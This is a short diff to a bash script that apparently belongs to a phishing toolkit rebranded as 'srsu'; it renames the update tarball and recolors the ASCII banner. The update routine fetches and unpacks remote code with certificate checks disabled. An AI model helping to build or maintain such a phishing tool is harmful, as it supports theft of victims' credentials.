@@ -163,12 +163,12 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".phishing.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".srsu.tar.gz" "${tarball_url}"
 
-		if [[ -e ".phishing.tar.gz" ]]; then
-			tar -xf .phishing.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".srsu.tar.gz" ]]; then
+			tar -xf .srsu.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .phishing.tar.gz
+			rm -f .srsu.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run phishing again\n\n"${WHITE}
@@ -192,15 +192,14 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${CYAN}
-  		${CYAN}
-		${CYAN}░██████╗██████╗░░██████╗██╗░░░██╗
-  		${CYAN}██╔════╝██╔══██╗██╔════╝██║░░░██║
-		${CYAN}╚█████╗░██████╔╝╚█████╗░██║░░░██║
-		${CYAN}░╚═══██╗██╔══██╗░╚═══██╗██║░░░██║
-		${CYAN}██████╔╝██║░░██║██████╔╝╚██████╔╝
-		${CYAN}╚═════╝░╚═╝░░╚═╝╚═════╝░░╚═════╝░		${RED}Version : ${__version__}
-
+		${LIME}
+  		${LIME}
+		${LIME}░██████╗██████╗░░██████╗██╗░░░██╗
+  		${LIME}██╔════╝██╔══██╗██╔════╝██║░░░██║
+		${LIME}╚█████╗░██████╔╝╚█████╗░██║░░░██║
+		${LIME}░╚═══██╗██╔══██╗░╚═══██╗██║░░░██║
+		${LIME}██████╔╝██║░░██║██████╔╝╚██████╔╝
+		${LIME}╚═════╝░╚═╝░░╚═╝╚═════╝░░╚═════╝░${RED}Version : ${__version__}
 		${RED}[${WHITE}-${RED}]${CYAN} Tool Created by ULTRA 303 (srsu)${WHITE}
 	EOF
 }
